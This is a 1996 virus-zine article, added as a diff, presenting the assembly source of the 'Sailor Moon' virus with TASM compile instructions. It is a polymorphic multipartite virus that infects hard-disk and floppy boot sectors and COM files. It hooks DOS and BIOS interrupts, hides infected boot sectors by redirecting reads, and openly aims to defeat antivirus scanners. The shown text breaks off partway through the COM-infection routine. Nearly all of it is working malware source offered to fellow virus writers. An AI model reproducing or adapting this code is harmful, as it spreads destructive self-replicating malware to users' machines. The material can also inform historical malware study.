@@ -1,0 +1,2738 @@
+Insane Reality issue #8 - (c)opyright 1996 Immortal Riot/Genesis - REALITY.026
+
+Article: Sailor Moon
+Author: b0z0 [iKx]
+
+% Sailor Moon Virus by b0z0 [iKx] %
+___________________________________
+
+Heres a very interesting virus from another Pandanian friend of ours, b0z0.
+Sailor Moon is a Polymorphic, Multi-Partite .COM infector, which places its
+self in the middle of files. You might like to see Dandler's article on
+Nexiv_Der which is also in this zine.
+
+Thank you b0z0, and good luck with iKx!
+
+SMPOLY.ASM and Debug Script follows.
+
+- _Sepultura_
+
+;=[BEGIN SMOON.ASM]==========================================================
+
+;******************************************************************************
+;
+; Virus name    : Sailor_Moon
+; Author        : b0z0
+; Group         : iKx
+; Origin        : Padania, October/November 1996
+; Compiling     : Use TASM
+;                 TASM /M5 SMOON.ASM
+;                 TLINK /T SMOON
+; Targets       : HD Boot Sector / FD Boot Sector / COM
+; Intro:        : Sailor_Moon is a rewrite of the Nexiv_Der virus. The poly
+;                 engine has been totally rewritten and many parts of the
+;                 original virus has been optimized, some bugs corrected,
+;                 and of course some new features added. So now an infected
+;                 machine won't crash every 3 minutes :)
+; Notes         : Sailor_Moon infects COM files by putting just a CALL
+;                 instruction to itself in a random place into the victim
+;                 file, so the scan for this virus is very hard and also
+;                 impossible for some antiviruses. To make also harder
+;                 the life of the AV people the virus also contains a
+;                 polymorphic engine that will encrypt the virus. The
+;                 polymorphic engine will of course preserve the values
+;                 of the registers at the moment of the call. The engine
+;                 will generate quite large decryptors which will also
+;                 contain calls to various INT 21h functions, jumps and
+;                 a lot of x86 operations. The virus also infects
+;                 the hard disk boot sector (MBR infection may alarm some
+;                 BIOSes) and the floppy boot sectors. While the virus is
+;                 in memory the virus will redirect any Read/Write/Verify
+;                 call for the boot sector to the original one. Also Reads
+;                 on the floppy boot sector will be redirected to the
+;                 original one. The virus will be stored on the floppy
+;                 disks on the normal data area. Before infecting a floppy
+;                 the virus will try to check if the space is free by
+;                 doing a little check on the FAT. The hard disk and
+;                 floppy boot sectors will contain only a loader that
+;                 will load and start the real virus. Of course also the
+;                 virus stored on the hard disk or floppyes (and the boot
+;                 loader) will be polymorphic.
+; Special thanx : to Dandler for doing the great disassembly of the original
+;                 Nexiv Der and for helping me in writing the Sailor_Moon
+; Greetings     : to all the guys of the iKx (Psycodad, JHB, Kernel Panic,
+;                 Giorgetto, Phoenix), Qark, kdkd, Wild W0rker, Galar,
+;                 Mindmaniac, Metabolis, Methyl, MrSandman and all the
+;                 other guys on #virus.
+; Contacts      : if you need to contact me mail me at bozo@ikx.org
+;
+;
+;******************************************************************************
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; The file is a COM
+
+seg_a   segment byte public
+assume  cs:seg_a, ds:seg_a
+
+org     100h
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Equs
+
+magic_char      equ     'S'                     ; 'S' as 'Sailor_Moon'
+                                                ; Used for
+                                                ; the r_u_there_call and
+                                                ; for other checks
+pos_polyloader  equ     50h                     ; Position of the poly
+                                                ; loader in the infected
+                                                ; boot
+                                                ; Must be a multiple of 16
+                                                ; and must not be smaller
+                                                ; than 50h
+pos_loader      equ     pos_polyloader - ([loader3] - [loader2])
+                                                ; Position of the loader
+                                                ; in infected boot
+
+boot_marker     equ     0AA55h                  ; Boot marker
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Just some other directives before the start...
+
+sailormoon      proc    near
+start:
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Virus start
+
+virus_start     label
+
+		push    cs
+		call    push_ip
+		ret
+
+push_ip:
+                pushf                           ; Save host flags
+		push    ax
+		push    bx
+		push    cx
+		push    dx
+		push    si
+		push    di
+		push    bp
+		push    ds
+                push    es                      ; Save host registers
+
+                sti                             ; Activate interrupts
+                cld                             ; Set direction of the
+                                                ; REPs to +1
+
+		call    delta_ip
+delta_ip:
+		pop     ax
+                sub     ax,offset delta_ip      ; Get the delta offset of
+                                                ; the IP
+
+		mov     cl,4
+                shr     ax,cl                   ; Divide it by 16
+		mov     bx,cs
+                add     ax,bx                   ; And add CS to it
+
+		push    ax
+		mov     ax,offset change_cs
+                push    ax
+                retf                            ; Change the segment, so
+                                                ; there wouldn't be any
+                                                ; offset
+
+change_cs:
+		push    cs
+		pop     ds
+
+		cmp     sp,7C00h - (2 + 2) - (2 * 10)
+                                                ; Has the virus started
+                                                ; from the boot?
+		je      starting_from_mbr
+
+                cmp     ds:first_gen,1          ; Is the virus a 1st gen?
+		je      loc1_im_a_first_gen
+
+		mov     bp,sp
+		sub     word ptr [bp + (2 + 2) + (2 * 10)],3
+                                                ; Decrement the IP by 3 to
+                                                ; execute also the
+                                                ; instruction overwritten
+                                                ; by the jump to the virus
+
+		mov     di,[bp + (2 + 2) + (2 * 10)]
+		mov     es,[bp + (2) + (2 * 10)]
+                                                ; ES:DI = position of the
+                                                ; jump to the virus
+		mov     si,offset host_bytes
+		movsb
+                movsw                           ; Reput the orig. 3 bytes
+                                                ; of the host overwritten
+                                                ; with the jump to the
+                                                ; virus
+
+loc1_im_a_first_gen:
+		push    cs
+		pop     es
+
+                mov     ds:first_gen,0          ; Reset the first_gen
+                                                ; field
+
+		mov     ax,3000h + magic_char
+		int     21h                     ; R u there call
+
+                cmp     ah,30h                  ; The virus is already
+                je      virus_already_in_memory ; in mem?
+
+                call    infect_hdd_from_file    ; Try to infect the
+                                                ; boot of the hard disk
+
+virus_already_in_memory:
+		pop     es
+		pop     ds
+		pop     bp
+		pop     di
+		pop     si
+		pop     dx
+		pop     cx
+		pop     bx
+                pop     ax                      ; Restore the registers
+                                                ; of the host
+                popf                            ; Restore the flag of
+                                                ; the host
+
+                retf                            ; Continue the execution
+                                                ; of the host
+
+starting_from_mbr:
+		cli
+                mov     sp,7C00h                ; Reset the stack
+                sti
+
+		xor     ax,ax
+		mov     ds,ax
+		mov     es,ax
+                mov     si,7C00h + 200h         ; At 7E00 there is the
+                                                ; original boot that has
+                                                ; been alreay read from
+                                                ; the loader
+                mov     di,sp                   ; DI = 7c00h
+                mov     cx,100h
+                rep     movsw                   ; Move the original MBR
+                                                ; at 0000:7C00
+
+		mov     ax,ds:[13h*4]
+		mov     cs:ip13,ax
+		mov     ax,ds:[13h*4 + 2]
+                mov     cs:cs13,ax              ; Save the Int 13h
+                                                ; vector
+
+                mov     cs:mz_counter,3         ; Inicialize the EXE file
+                                                ; counter
+
+                mov     ax,ds:[413h]            ; AX = total mem in K
+sub ax,(offset virus_mem_end-offset virus_start+3FFh)/400h
+                mov     ds:[413h],ax            ; Allocate the needed mem
+
+		mov     cl,6
+		shl     ax,cl
+		sub     ax,10h
+                mov     es,ax                   ; ES = segment of the
+                                                ; reserved memory
+
+		push    cs
+		pop     ds
+
+		mov     si,offset virus_start
+                mov     di,si
+                mov     cx,(offset virus_mem_end-offset virus_start+ 1) /2
+                rep     movsw                   ; Copy the virus in the
+                                                ; reserved memory
+
+		xor     ax,ax
+                mov     ds,ax                   ; Point DS to the IVT
+		mov     word ptr ds:[13h*4],offset int_13_entry
+                mov     ds:[13h*4 + 2],es       ; Hook the Int 13
+
+                call    infect_hdd_from_boot    ; Try to infect the hard
+                                                ; disk boot
+
+		xor     ax,ax
+		mov     ds,ax
+                mov     es,ax                   ; Set to 0 the segment
+                                                ; registers
+
+		db      0EAh
+                dw      7C00h, 0                ; Exec the original boot
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Infect, if it hasn't been already, the hard disk boot
+
+infect_hdd_from_file:
+		mov     ah,62h
+                int     21h                     ; Ask the segment of the
+                                                ; current PSP
+		dec     bx
+		mov     ds,bx
+                mov     ax,ds:[10h + 2]         ; AX = total mem/16
+sub ax,(offset virus_disc_end-offset virus_start+0A00h)/10h+1
+
+                mov     es,ax                   ; ES = free mem segment
+
+                call    hdd_infection           ; HDD infection routine
+
+		ret
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Infect, if it hasn't been already, the hard disk boot
+
+infect_hdd_from_boot:
+                mov     ax,ds:[413h]            ; AX = total mem in K
+
+sub ax,(offset virus_disc_end-offset virus_start+0A00h+3ffh)/400h
+
+		mov     cl,6
+		shl     ax,cl
+                mov     es,ax                   ; ES = segment of free mem
+
+                call    hdd_infection           ; HDD infection routine
+
+                ret
+
+hdd_infection:
+                push    cs
+		pop     ds
+
+		mov     ax,201h                 ; Read a sector
+		xor     bx,bx
+		mov     cx,1                    ; Cylinder 0 / Sector 1
+		mov     dx,180h                 ; Side 1 / Drive 80h
+                call    int13_retry             ; Read the hard disk boot
+
+		nowarn
+		cmp     byte ptr es:[bx + 1],pos_loader - 2
+                                                ; Is the boot already
+                                                ; infected
+                warn
+                jne     hdd_not_already_infected
+                jmp     hdd_already_infected
+
+hdd_not_already_infected:
+		mov     ax,301h                 ; Write a sector
+                push    ax
+                xor     bx,bx
+
+                mov     cx,2                    ; Cylinder 0 / Sector 2
+		mov     dx,80h                  ; Side 0 / Drive 80h
+                call    int13_retry             ; Save the original boot
+
+		mov     si,offset loader
+		xor     di,di
+		mov     cx,offset loader2 - offset loader1
+		rep     movsb
+		nowarn
+		mov     di,pos_loader
+		warn
+		mov     cx,offset loader3 - offset loader2
+                rep     movsb                   ; Overwrite the boot code
+                                                ; with the first part of
+                                                ; the loader code
+		push    es
+		mov     ax,es
+		add     ax,pos_polyloader/10h
+		mov     es,ax
+
+loop2_create_poly_loader:
+                sub     ax,ax                    ; Generate loader code
+		mov     cx,offset loader4 - offset loader3
+		mov     dx,offset loader3
+                call    poly                    ; Call the poly engine
+		push    cs
+		pop     ds
+cmp cx,200h-(pos_loader+(offset loader3-offset loader2)+2)
+		ja      loop2_create_poly_loader
+		pop     es
+
+		mov     word ptr es:[200h - 2],boot_marker
+                                                ; Add the boot signature
+
+                pop     ax                      ; AX = 301h
+		xor     bx,bx
+		mov     cx,1                    ; Cylinder 0 / Sector 1
+		mov     dx,180h                 ; Side 1 / Drive 80h
+                call    int13_retry             ; Write the infected boot
+
+loop_create_poly_boot:
+                mov     al,1                    ; Generate boot code
+		mov     cx,offset virus_disc_end - offset virus_start
+		mov     dx,offset virus_start
+                call    poly                    ; Call the poly engine
+		push    cs
+		pop     ds
+
+mov ax,300h+(offset virus_disc_end-offset virus_start+0A00h+1FFh)/200h
+                                                ; Write sectors
+
+                xor     bx,bx
+                mov     cx,3                    ; Cylinder 0 / Sector 3
+		mov     dx,80h                  ; Side 0 / Drive 80h
+                call    int13_retry             ; Write the virus body
+
+hdd_already_infected:
+		push    cs
+                pop     es
+
+                ret
+
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Int 13h Handler
+
+int_13_entry:
+                cmp     cs:mz_counter,0         ; Mz_counter is 0?
+		jne     loc1_int_13_entry
+
+                cmp     cx,1
+		jne     loc1_int_13_entry
+                cmp     dx,180h                 ; Read/Write/Verify of
+                                                ; the hd boot requested?
+                jne     loc1_int_13_entry
+
+		push    cx
+		push    dx
+
+                mov     cx,2
+		mov     dh,0
+                call    int13_orig_retry        ; Give the original boot
+                                                ; saved at 0/0/2
+		pop     dx
+		pop     cx
+
+                retf    2                       ; Return to DOS
+
+loc1_int_13_entry:
+		cmp     ah,2
+		jne     loc3_int_13_entry
+                cmp     cs:mz_counter,0         ; Mz_counter is 0?
+		je      loc3_int_13_entry
+
+                pushf
+                call    dword ptr cs:ip13       ; Do the requested read
+
+
+                pushf
+                cmp     word ptr es:[bx],'ZM'   ; Is the system reading
+                                                ; an .EXE?
+		jne     loc2_int_13_entry
+
+                dec     cs:mz_counter           ; Decrement of 1
+						; mz_counter
+		cmp     byte ptr cs:mz_counter,0
+                                                ; Is mz_counter 0?
+		jne     loc2_int_13_entry
+
+                mov     cs:file_buffer,0        ; Reset the field
+						; file_buffer
+
+		push    ax
+		push    ds
+		xor     ax,ax
+                mov     ds,ax                   ; Point DS to the IVT
+
+		mov     ax,ds:[21h*4]
+		mov     cs:ip21,ax
+		mov     ax,ds:[21h*4 + 2]
+                mov     cs:cs21,ax              ; Save the Int 21h vector
+
+		mov     word ptr ds:[21h*4],offset int_21_entry
+                mov     ds:[21h*4 + 2],cs       ; Hook the Int 21h
+
+		pop     ds
+		pop     ax
+
+loc2_int_13_entry:
+		popf
+                retf    2                       ; Return to DOS
+
+loc3_int_13_entry:
+		cmp     ax,201h
+		jne     int_13
+		cmp     cx,1
+		jne     int_13
+		cmp     dh,0
+		jne     int_13
+                cmp     dl,1                    ; Read of the floppy boot
+                                                ; requested?
+		jbe     check_floppy_boot
+
+int_13:
+		db      0EAh
+ip13            dw      ?
+cs13            dw      ?                       ; Jump to the original
+                                                ; Int 13h
+
+check_floppy_boot:
+
+                pushf
+                call    dword ptr cs:ip13       ; Read the boot as
+                                                ; requested
+
+                pushf                           ; Save flags
+		push    ax
+		push    bx
+		push    cx
+		push    dx
+		push    si
+		push    di
+		push    bp
+		push    ds
+                push    es                      ; Save registers
+
+                jnc     loc1_check_floppy_boot  ; An error at boot read
+                                                ; occoured?
+preexit_check_floppy_boot:
+		jmp     exit_check_floppy_boot
+diskfilled:
+                pop     bx
+                pop     es
+                jmp     exit_check_floppy_boot
+
+loc1_check_floppy_boot:
+		sti
+		cld
+
+		push    cs
+		pop     ds
+
+		nowarn
+		cmp     byte ptr es:[bx + 1],pos_loader - 2
+                                                ; Is the floppy already
+                                                ; infected?
+		warn
+                jne     infect_fboot
+
+                mov     ax,201h                 ; give the original one
+                mov     cx,4f01h                ; in ES:BX
+                mov     dh,1
+                call    int13_orig_retry
+                jmp     preexit_check_floppy_boot
+
+infect_fboot:
+		cmp     word ptr es:[bx + 13h],2880
+                                                ; Is the floppy a 1.44?
+		jne     preexit_check_floppy_boot
+
+                push    es
+                push    bx
+
+                push    cs
+                pop     es
+                mov     bx,offset sector_buffer
+
+                mov     ax,201h
+                mov     cx,9                    ; read first FAT
+                sub     dh,dh                   ; the final part only
+                call    int13_orig_retry
+
+                mov     di,bx
+                add     di,096h                 ; offset for our clusters
+                cmp     word ptr es:[di+1],0000h; disk seems full?
+                jne     diskfilled              ; so bye bye...
+
+                pop     bx
+                pop     ds
+                mov     si,bx
+
+		mov     ax,cs
+		add     ax,10h
+add ax,(offset virus_disc_end-offset virus_start)/10h+1
+		mov     es,ax
+
+		xor     di,di
+                mov     cx,100h
+                rep     movsw                   ; Copy the boot in the
+						; buffer
+
+		push    cs
+		pop     ds
+		mov     ax,301h                 ; Write a sector
+		xor     bx,bx
+		mov     cx,4F01h                ; Cylinder 79 / Sector 1
+		mov     dh,1                    ; Side 1
+                call    int13_orig_retry        ; Save the original boot
+                jnc     dontexit
+                jmp     exit_check_floppy_boot
+
+dontexit:
+		mov     si,offset loader
+		xor     di,di
+		mov     cx,offset loader2 - offset loader1
+		rep     movsb
+		nowarn
+		mov     di,pos_loader
+		warn
+		mov     cx,offset loader3 - offset loader2
+                rep     movsb                   ; Overwrite the boot code
+                                                ; with the first part of
+                                                ; the loader code
+
+		mov     ax,es
+		add     ax,pos_polyloader/10h
+		mov     es,ax
+		push    dx
+
+loop3_create_poly_boot:
+                sub     ax,ax                   ; Generate loader code
+		mov     cx,offset loader4 - offset loader3
+		mov     dx,offset loader3
+                call    poly                    ; Call the poly engine
+		push    cs
+		pop     ds
+cmp cx,200h-(pos_loader+(offset loader3-offset loader2)+2)
+		ja      loop3_create_poly_boot
+
+                mov     word ptr es:[200h - 2],boot_marker
+
+		pop     dx
+
+		mov     ax,es
+		sub     ax,pos_polyloader/10h
+		mov     es,ax
+
+		mov     ax,301h                 ; Write a sector
+		xor     bx,bx
+		mov     cx,1                    ; Cylinder 0 / Sector 1
+		mov     dh,0                    ; Side 0
+                call    int13_orig_retry        ; Overwrite the boot with
+                                                ; the infected one
+		jc      exit_check_floppy_boot
+
+		xor     bp,bp
+
+loop1_move_virus_code:
+		push    dx
+                mov     ax,201h                 ; Read a sector
+                xor     bx,bx
+
+                mov     cx,3                    ; Cylinder 0
+                add     cx,bp                   ; Sector 3 + BP
+		mov     dx,80h                  ; Side 0 / Drive 80h
+                call    int13_orig_retry        ; Read virus sectors from
+                                                ; hard disk
+		pop     dx
+                mov     ax,301h                 ; Write a sector
+		xor     bx,bx
+		mov     cx,4F02h                ; Cylinder 79
+		add     cx,bp                   ; Sector 2 + BP
+		mov     dh,1                    ; Side 0
+                call    int13_orig_retry        ; Write virus sectors on
+                                                ; the floppy
+		inc     bp
+cmp     bp,(offset virus_disc_end-offset virus_start+0a00h)/200h+1
+                jne     loop1_move_virus_code
+
+
+
+
+exit_check_floppy_boot:
+		pop     es
+		pop     ds
+		pop     bp
+		pop     di
+		pop     si
+		pop     dx
+		pop     cx
+		pop     bx
+                pop     ax                      ; Restore registers
+                popf                            ; Restore flags
+
+                retf    2                       ; Return to DOS
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Int 21h Handler
+
+int_21_entry:
+                cmp     ax,3000h + magic_char   ; Has been called the
+						; r_u_there_call?
+		je      r_u_there_call
+
+                cmp     ax,4B00h                ; A file being executed?
+
+                je      check_file
+
+		db      0EAh
+ip21            dw      ?
+cs21            dw      ?                       ; Jump to the original
+                                                ; Int 21h
+
+r_u_there_call:
+		iret                            ; Do nothing
+
+check_file:
+		push    ax
+		push    bx
+		push    cx
+		push    dx
+		push    si
+		push    di
+		push    bp
+		push    ds
+                push    es                      ; Save registers
+
+		sti
+		cld
+
+		push    cs
+		pop     es
+		mov     si,dx
+		mov     di,offset file_name
+		mov     cx,64
+                rep     movsb                   ; Copy the filename
+
+		push    cs
+		pop     ds
+
+                mov     ds:our_vectors_in,00h   ; Hook control
+
+                mov     ax,3D00h
+		mov     dx,offset file_name
+                int     21h                     ; Open the file to infect
+						; in ReadOnly
+		jnc     loc1_check_file
+		jmp     exit_check_file
+
+loc1_check_file:
+		mov     bx,ax                   ; BX = file handle
+
+		mov     ah,3Fh
+		mov     cx,32
+		mov     dx,offset file_buffer
+                int     21h                     ; Read the first 32 bytes
+                                                ; of the file
+
+                cmp     ax,cx                   ; The file is long at
+                                                ; least 32 bytes?
+		jne     dont_infect_file
+		cmp     word ptr ds:file_buffer,'MZ'
+                                                ; Is the file an EXE?
+		je      dont_infect_file
+		cmp     word ptr ds:file_buffer,'ZM'
+                                                ; Is the file an EXE?
+		je      dont_infect_file
+
+		mov     ax,5700h
+                int     21h                     ; Ask the filedate
+
+		and     cx,1Fh
+                cmp     cx,7                    ; The seconds of the file
+                                                ; are 7?
+		je      dont_infect_file
+
+		mov     ax,4202h
+		xor     cx,cx
+		xor     dx,dx
+                int     21h                     ; Point at the end of the
+                                                ; file
+
+                cmp     dx,0                    ; File is >= 65536 bytes?
+		jne     dont_infect_file
+                cmp     ax,1000                 ; File is < 1000 bytes?
+		jb      dont_infect_file
+                cmp     ax,55000                ; File is > 55000 bytes?
+		ja      dont_infect_file
+
+                mov     ds:file_length,ax       ; Save the file lenght
+
+		mov     ax,3503h
+                int     21h                     ; Get Int 3 vector
+
+		mov     ds:ip03,bx
+                mov     ds:cs03,es              ; Save the vector
+
+                mov     al,13h                  ; AX=3513h
+                int     21h                     ; Get Int 13h vector
+
+		mov     ds:temp_ip13,bx
+                mov     ds:temp_cs13,es         ; Save the vector
+
+                mov     ds:our_vectors_in,01h   ; Hook control
+
+		push    cs
+		pop     es
+
+		mov     ax,2503h
+		mov     dx,offset int_3_entry
+                int     21h                     ; Hook Int 3
+
+                mov     al,13h                  ; AX=2513h
+		mov     dx,offset temp_int_13_entry
+                int     21h                     ; Hook Int 13h
+
+		jmp     close_file
+
+dont_infect_file:
+                mov     ds:file_buffer,0        ; Reset the field
+						; file_buffer
+
+close_file:
+		mov     ah,3Eh
+                int     21h                     ; Close the file
+
+		mov     ah,0Dh
+                int     21h                     ; Reset the buffer
+
+exit_check_file:
+		pop     es
+		pop     ds
+		pop     bp
+		pop     di
+		pop     si
+		pop     dx
+		pop     cx
+		pop     bx
+                pop     ax                      ; Restore registers
+
+		pushf
+                call    dword ptr cs:ip21       ; Execute the file
+
+                mov     cs:file_buffer,0        ; Reset the field
+						; file_buffer
+
+		pushf
+		push    ax
+		push    dx
+		push    ds
+
+                cmp     cs:our_vectors_in,00h   ; restore old vectors
+                je      dont_restore_vectors    ; only if we set them
+                                                ; before
+		mov     ax,2501h
+		mov     dx,cs:ip01
+		mov     ds,cs:cs01
+                int     21h                     ; Restore Int 1 vector
+
+                mov     al,03h                  ; AX=2503h
+		mov     dx,cs:ip03
+		mov     ds,cs:cs03
+                int     21h                     ; Restore Int 3 vector
+
+                mov     al,13h                  ; AX=2513h
+		mov     dx,cs:temp_ip13
+		mov     ds,cs:temp_cs13
+                int     21h                     ; Restore Int 13h vector
+
+dont_restore_vectors:
+
+		pop     ds
+		pop     dx
+		pop     ax
+		popf
+
+                retf    2                       ; Return to DOS
+
+our_vectors_in          db      00h
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Int 3 Handler
+
+int_3_entry:
+                pushf                           ; Save flags
+		push    ax
+		push    bx
+		push    cx
+		push    dx
+		push    si
+		push    di
+		push    bp
+		push    ds
+                push    es                      ; Save registers
+
+		sti
+		cld
+
+		push    cs
+		pop     ds
+		mov     si,offset file_buffer
+		mov     di,offset virus_start
+		mov     cx,32
+                rep     movsb                   ; Delete the Int 3 at
+                                                ; the start of the host
+
+                mov     byte ptr file_buffer,0  ; Reset the field
+						; file_buffer
+
+		mov     ah,0Dh
+                int     21h                     ; Reset the buffers
+
+		mov     di,offset virus_start
+		add     di,ds:file_length
+		mov     al,magic_char
+		mov     cx,(offset virus_disc_end - offset virus_start)*3
+		rep     stosb
+                mov     ds:host_segment,es      ; Fill the tail of the file
+                                                ; with the magic_char to
+                                                ; find the memory zones
+                                                ; that the host doesn't
+                                                ; overwrite
+
+		mov     ax,3501h
+                int     21h                     ; Get Int 1 vector
+
+		mov     ds:ip01,bx
+                mov     ds:cs01,es              ; Save the vector
+
+                mov     ah,25h                  ; AX=2501h
+		mov     dx,offset int_1_entry
+                int     21h                     ; Hook Int 1
+
+                mov     al,03h                  ; AX=2503h
+		mov     dx,ds:ip03
+		mov     ds,ds:cs03
+                int     21h                     ; Restore Int 3
+
+                mov     al,13h                  ; AX=2513h
+		mov     dx,cs:temp_ip13
+		mov     ds,cs:temp_cs13
+                int     21h                     ; Restore Int 13h
+
+		push    cs
+		pop     ds
+
+		in      al,40h                  ; AL = random
+		and     al,3
+		mov     ah,al
+		in      al,40h                  ; AL = random
+		add     ax,100h                 ; 256 < AX < 1279
+                mov     ds:inst_counter,ax      ; Set with AX the number
+                                                ; of instructions that
+                                                ; will be executed before
+                                                ; inserting the virus
+
+		pop     es
+		pop     ds
+		pop     bp
+		pop     di
+		pop     si
+		pop     dx
+		pop     cx
+		pop     bx
+                pop     ax                      ; Restore the registers
+                popf                            ; Restore the flags
+
+		push    bp
+		mov     bp,sp
+                dec     word ptr [bp + 2]       ; Decrement the IP by 1
+                                                ; to execute the host from
+                                                ; start but without the
+                                                ; Int 3
+		or      word ptr [bp + 6],100h  ; Trace = ON
+		pop     bp
+
+                iret                            ; Execute the host with
+                                                ; activated trace
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Secondary Int 13h handler
+
+temp_int_13_entry:
+                cmp     cs:file_buffer,0        ; The control has been
+                                                ; already disabled?
+		je      temp_int_13
+
+                cmp     ah,2                    ; Read requested?
+
+		jne     temp_int_13
+
+		pushf
+                call    dword ptr cs:temp_ip13  ; Execute the read
+                jc      error_reading_temp_int13
+
+		pushf
+		push    cx
+		push    si
+		push    di
+		push    ds
+
+		push    cs
+		pop     ds
+
+		mov     si,offset file_buffer
+		mov     di,bx
+		mov     cx,32
+                repe    cmpsb                   ; Compare the first 32
+                                                ; bytes of the readed
+                                                ; sector with those readed
+                                                ; from the file
+		jnz     dont_insert_int3
+
+                mov     byte ptr es:[bx],0CCh   ; Insert an Int 3 at the
+                                                ; sector start
+
+dont_insert_int3:
+		pop     ds
+		pop     di
+		pop     si
+		pop     cx
+		popf
+
+error_reading_temp_int13:
+                retf    2                       ; Return to DOS
+
+temp_int_13:
+		db      0EAh
+temp_ip13       dw      ?
+temp_cs13       dw      ?                       ; Jump to the original
+                                                ; Int 13
+
+;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
+; Int 1 Handler
+
+int_1_entry:
+		push    bp
+		mov     bp,sp
+		push    ax
+		mov     ax,[bp + 4]
+                cmp     cs:host_segment,ax      ; Check if the host code
+                                                ; is traced
+		pop     ax
+		jnz     exit_int_1_entry
+
+                cmp     cs:inst_counter,0       ; The instruction counter
+                                                ; is 0?
+		je      time_to_infect
+
+                dec     cs:inst_counter         ; Decrement the
+                                                ; instruction counter
+exit_int_1_entry:
+		pop     bp
+                iret                            ; Execute another
+                                                ; instuction
+
+time_to_infect:
+		sti
+		cld
+
+		push    ax
+		push    si
+		push    ds
+
+                lds     si,dword ptr [bp + 2]   ; DS:SI = CS:IP of the host
+                mov     al,[si]                 ; AL = instruction at DS:SI
+                cmp     al,0bfh                 ; can be a MOV reg16,imm ?
+                ja      no_reg_move
+                cmp     al,0b8h                 ; is a MOV reg16,imm?
+                jae     istr_ok                 ; ae = yeah
+no_reg_move:
+                cmp     al,0E8h                 ; Is a CALL?
+		je      istr_ok
+                cmp     al,0E9h                 ; Is a JMP?
+		je      istr_ok
+		cmp     al,80h
+		jne     istr_not_ok
+		mov     al,[si + 1]
+		and     al,0C0h
+                cmp     al,0C0h                 ; Is a ADD/SUB/XOR?
+		je      istr_ok
+
+istr_not_ok:
+		pop     ds
+		pop     si
+		pop     ax
+
+                jmp     exit_int_1_entry        ; It isn't a 3 byte
+                                                ; instruction, trace again
+                                                ; the host
+
+istr_ok:
+		mov     cs:call_position,si
+		sub     cs:call_position,offset virus_start
+                                                ; Save the position where
+                                                ; will be inserted the
+                                                ; jump to the virus
+
+		push    di
+		push    es
+		push    cs
+		pop     es
+
+		mov     di,offset host_bytes
+		movsb
+                movsw                           ; Save the 3 bytes that
+                                                ; will be overwritten by
+                                                ; the virus jump
+
+		pop     es
+		pop     di
+		pop     ds
+		pop     si
+		pop     ax
+
+		push    ax
+		push    bx
+		push    cx
+		push    dx
+		push    si
+		push    di
+		push    bp
+		push    ds
+                push    es                      ; Save registers
+
+		mov     ds,cs:host_segment
+		mov     si,cs:file_length
+                add     si,offset virus_start   ;DS:SI = tail of the host
+		mov     cx,(offset virus_disc_end - offset virus_start)*3
+		xor     bx,bx
+
+loop1_look_4_space:
+		lodsb
+		cmp     al,magic_char
+		jne     loc1_look_4_space
+		inc     bx
+		jmp     loc2_look_4_space
+loc1_look_4_space:
+		xor     bx,bx
+loc2_look_4_space:
+cmp bx,32+(offset virus_disc_end-offset virus_start)+32
+		je      space_found
+                loop    loop1_look_4_space      ; Search enought mem space
+                                                ; that wouldn't be modified
+                                                ; by the host
+exit_trace:
+		pop     es
+		pop     ds
+		pop     bp
+		pop     di
+		pop     si
+		pop     dx
+		pop     cx
+		pop     bx
+                pop     ax                      ; Restore registers
+
+		push    ax
+		push    dx
+		push    ds
+
+		mov     ax,2501h
+		mov     dx,cs:ip01
+		mov     ds,cs:cs01
+                int     21h                     ; Restore Int 1 vector
+
+		pop     ds
+		pop     dx
+		pop     ax
+
+		and     word ptr [bp + 6],0FEFFh; TRACER = OFF
+
+                jmp     exit_int_1_entry        ; Leave the host running
+                                                ; without tracer enabled
+
+space_found:
+		sub     si,offset virus_disc_end - offset virus_start + 20h
+		and     si,0FFF0h
+		sub     si,offset virus_start
+                mov     cs:virus_position,si    ; Save the position where
+                                                ; put the virus
+
+		mov     ax,3524h
+                int     21h                     ; Get Int 24h handler
+
+		mov     cs:ip24,bx
+                mov     cs:cs24,es              ; Save the vector
+
+		push    cs
+		pop     ds
+		push    cs
+		pop     es
+
+                mov     ah,25h                  ; AX=2524h
+		mov     dx,offset int_24_entry
+                int     21h                     ; Hook Int 24h
+
+		mov     ax,4300h
+		mov     dx,offset file_name
+                int     21h                     ; Get file attributes
+
+                mov     ds:file_attrib,cx       ; Save file attributes
+
+		mov     ax,4301h
+		mov     dx,offset file_name
+		xor     cx,cx
+                int     21h                     ; Reset file attributes
+
+		mov     ax,3D02h
+		mov     dx,offset file_name
+                int     21h                     ; Open the file in
+						; Read&Write
+
+		jnc     loc1_infect
+		jmp     exit_infect
+
+loc1_infect:
+		mov     bx,ax                   ; BX = file handle
+
+		mov     ax,5700h
+                int     21h                     ; Get file date
+
+		mov     ds:file_time,cx
+                mov     ds:file_date,dx         ; Save file date
+
+		mov     ax,4200h
+		xor     cx,cx
+		mov     dx,ds:call_position
+                int     21h                     ; Point to the selected
+                                                ; instruction for the
